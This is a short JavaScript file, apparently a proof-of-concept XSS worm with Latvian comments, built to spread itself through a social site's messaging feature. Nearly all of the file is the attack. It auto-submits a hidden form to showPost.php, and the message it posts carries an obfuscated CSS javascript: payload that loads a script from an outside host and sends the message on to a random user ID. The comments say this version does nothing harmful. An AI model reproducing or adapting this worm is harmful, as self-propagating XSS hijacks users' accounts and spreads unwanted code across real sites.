/*
//(proof-of-concept) draugberts
//
// teoreetiski pats izsuuta sevi taalaak, ja lietotaajs atver veestuli
// un ja lietotaajam ir IE. Diemzheel (?) Firefox bija paaraak gudrs,
// man taa arii neizdevaas vinju apchakareet, par Operu nezinu.
// Shii draugberta versija nenodarbojaas nearko kaitiigu, tikai pieraada principu!
//
// paldies: rem, Cmz, r21vo
// sveicieni: r04, ziicks, wen, endrju
//
// luugums atstaat sho komentaaru.
*/ 

function conv(s) {
	str = s.charCodeAt(0);

	for (i = 1; i < s.length; i++) {
		str = str + "," + s.charCodeAt(i);
	};
	return str;
};
function randomid(min_id,max_id) {
	var st = max_id-min_id+1;
	var rn = Math.floor(Math.random()*st+min_id); 
	return rn;
};

var header_name = "header";
var header_value = "heheeij!";

var message_name = "body";
var message_text = "Eu ieveertee shito beibi! .. <br /><br /> [ paarbrauc ar peli kvadraatinjam ]";
var js_url = "http://lethal.fabrika.lv/draugberts2.js";
var css_msg_style = "height:200px;width:300px;";
var message = '<script src=\"'+js_url+'\"></script>';
var converted_msg = conv(message);

var generated = randomid(1000,550000);
var to_name = "id";

var post_url = "showPost.php";


document.write('<form method="post" name="msg">');
document.write('<input type="hidden" value="'+header_value+'" name="'+header_name+'" />');
document.write('<input type="hidden" value="'+generated+'" name="'+to_name+'" />');
document.write('<input type="hidden" name="'+message_name+'" value="<div style=\'background-Image:URL(javascript:document.write(String.fromCharCode('+converted_msg+')))\' style=\''+css_msg_style+'\'>'+message_text+'</div>" />');
document.write('</form>');
document.msg.action = post_url;

document.msg.submit();